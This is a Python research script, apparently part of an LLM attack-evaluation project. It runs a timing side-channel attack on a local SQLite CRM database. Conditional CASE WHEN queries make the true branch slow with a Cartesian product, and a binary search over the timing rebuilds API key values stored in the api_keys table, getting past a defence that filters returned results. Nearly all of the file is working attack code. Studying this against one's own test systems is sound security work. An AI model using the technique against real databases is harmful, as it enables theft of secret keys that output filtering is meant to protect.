"""
Phase 7 (方向 3): 时序侧信道攻击 — 突破结果过滤防御

核心创新：
  当防御层做"结果过滤"（D4：检测返回值中的 FAKE_ 前缀并脱敏）时，
  攻击者无法从返回内容读出数据。但 CASE WHEN 的两个分支可以构造
  不同计算量的查询，使"真分支"执行笛卡尔积（慢）而"假分支"直接返回（快）。

  判别查询：
    SELECT CASE WHEN substr(hex(key_value), i, 1) > '8'
           THEN (SELECT count(*) FROM api_keys a, api_keys b, api_keys c)
           ELSE 1 END FROM api_keys LIMIT 1

  时间差即可作为 1 比特信道，无需读取任何返回内容。
  本脚本实现该攻击并测量时间差的可分辨性。
"""
import sqlite3
import time
import json
import statistics
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict

HEX_CHARSET = "0123456789ABCDEF"

@dataclass
class TimingSample:
    position: int
    threshold: str
    bit: int
    duration_ms: float

class TimingSideChannelAttack:
    def __init__(self, db_path: str, repeat: int = 15):
        self.db_path = db_path
        self.repeat = repeat
        self.samples: List[TimingSample] = []
        self.probe_count = 0

    def _timed_scalar(self, query: str) -> Tuple[Optional[int], float]:
        """执行查询并返回 (结果, 耗时ms)"""
        self.probe_count += 1
        start = time.perf_counter()
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(query)
            row = cursor.fetchone()
            conn.close()
            elapsed = (time.perf_counter() - start) * 1000
            val = int(row[0]) if row is not None else None
            return val, elapsed
        except Exception:
            elapsed = (time.perf_counter() - start) * 1000
            return None, elapsed

    def calibrate(self) -> Dict:
        """校准：测量真/假分支的基准耗时"""
        print("[校准] 测量真/假分支基准耗时...")
        fast_query = "SELECT 1 FROM api_keys LIMIT 1"
        slow_query = ("SELECT (SELECT count(*) FROM api_keys a, api_keys b, "
                      "api_keys c) FROM api_keys LIMIT 1")

        fast_times = []
        slow_times = []
        for _ in range(self.repeat):
            _, t = self._timed_scalar(fast_query)
            fast_times.append(t)
        for _ in range(self.repeat):
            _, t = self._timed_scalar(slow_query)
            slow_times.append(t)

        fast_med = statistics.median(fast_times)
        slow_med = statistics.median(slow_times)
        margin = slow_med - fast_med

        calib = {
            "fast_median_ms": round(fast_med, 3),
            "slow_median_ms": round(slow_med, 3),
            "margin_ms": round(margin, 3),
            "margin_us": round(margin * 1000, 1),
            "repeat": self.repeat,
            "distinguishable": margin > 1.0
        }
        print(f"  快分支: {fast_med:.3f} ms | 慢分支: {slow_med:.3f} ms | 差值: {margin:.3f} ms")
        print(f"  可分辨阈值 (>1ms): {'是' if calib['distinguishable'] else '否'}")
        return calib

    def timing_probe(self, position: int, threshold: str, table: str, column: str) -> int:
        """时序判别探针：返回推断的比特值（基于耗时）"""
        query = (
            f"SELECT CASE WHEN substr(hex({column}), {position}, 1) > '{threshold}' "
            f"THEN (SELECT count(*) FROM {table} a, {table} b, {table} c) "
            f"ELSE 1 END FROM {table} LIMIT 1"
        )
        # 重复测量取中位数
        durations = []
        for _ in range(self.repeat):
            _, t = self._timed_scalar(query)
            durations.append(t)
        med = statistics.median(durations)

        # 需要与真/假基准比较；这里用"是否显著慢于快分支"判别
        # 简化：单次测量 > 阈值则判 1
        self._last_median = med
        # 由调用方根据校准阈值判定
        return med

    def reconstruct_position(self, position: int, table: str, column: str,
                             calib: Dict) -> Optional[str]:
        """对单个位置做二分搜索，用耗时作为判别依据"""
        candidates = list(HEX_CHARSET)
        while len(candidates) > 1:
            mid = len(candidates) // 2
            threshold = candidates[mid - 1]
            med = self.timing_probe(position, threshold, table, column)

            # 判别：若耗时接近慢分支 → 条件为真（比特 1）
            midpoint = (calib["fast_median_ms"] + calib["slow_median_ms"]) / 2
            bit = 1 if med > midpoint else 0

            self.samples.append(TimingSample(
                position=position, threshold=threshold, bit=bit, duration_ms=round(med, 3)
            ))

            if bit == 1:
                candidates = candidates[mid:]
            else:
                candidates = candidates[:mid]
        return candidates[0] if candidates else None

    def run(self, table: str = "api_keys", column: str = "key_value",
            max_positions: int = 8) -> Dict:
        print("=" * 70)
        print("Phase 7 (方向 3): 时序侧信道攻击")
        print("=" * 70)

        calib = self.calibrate()
        if not calib["distinguishable"]:
            print("\n[警告] 时间差不足 1ms，时序攻击在本环境不可靠。")
            print("       仍记录数据用于分析（可能需要更大表或远程数据库）。")

        # 获取 hex 长度（用结果信道，假设结果过滤未启用或可接受）
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(f"SELECT length(hex({column})) FROM {table} LIMIT 1")
        hex_len = cursor.fetchone()[0]
        conn.close()
        print(f"\n目标 hex 长度: {hex_len}（本次测试前 {max_positions} 位）")

        reconstructed = []
        for pos in range(1, min(max_positions, hex_len) + 1):
            char = self.reconstruct_position(pos, table, column, calib)
            if char is None:
                break
            reconstructed.append(char)
            print(f"  位置 {pos}: '{char}'（累计: {''.join(reconstructed)}）")

        hex_partial = "".join(reconstructed)
        # 用直接 hex 校验
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(f"SELECT hex({column}) FROM {table} LIMIT 1")
        ground_truth = cursor.fetchone()[0]
        conn.close()

        match = ground_truth[:len(hex_partial)] == hex_partial
        accuracy = round(sum(1 for a, b in zip(hex_partial, ground_truth)
                             if a == b) / max(len(hex_partial), 1) * 100, 1)

        result = {
            "calibration": calib,
            "hex_length": hex_len,
            "positions_tested": len(reconstructed),
            "reconstructed_partial_hex": hex_partial,
            "ground_truth_prefix": ground_truth[:len(hex_partial)],
            "exact_match": match,
            "per_char_accuracy": accuracy,
            "total_probes": self.probe_count,
            "repeat_per_probe": self.repeat,
            "samples": [asdict(s) for s in self.samples],
            "conclusion": (
                f"时序侧信道在 {accuracy}% 字符上与真值一致；"
                f"时间差 {calib['margin_ms']:.3f} ms，"
                f"{'可分辨' if calib['distinguishable'] else '不可分辨（噪声主导）'}。"
            )
        }
        return result

def main():
    db_path = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\enhanced_crm.db"
    attack = TimingSideChannelAttack(db_path, repeat=15)
    result = attack.run(max_positions=8)

    output_path = "results/phase7_timing_sidechannel.json"
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n结果已保存到: {output_path}")
    print(f"结论: {result['conclusion']}")
    return result

if __name__ == "__main__":
    main()
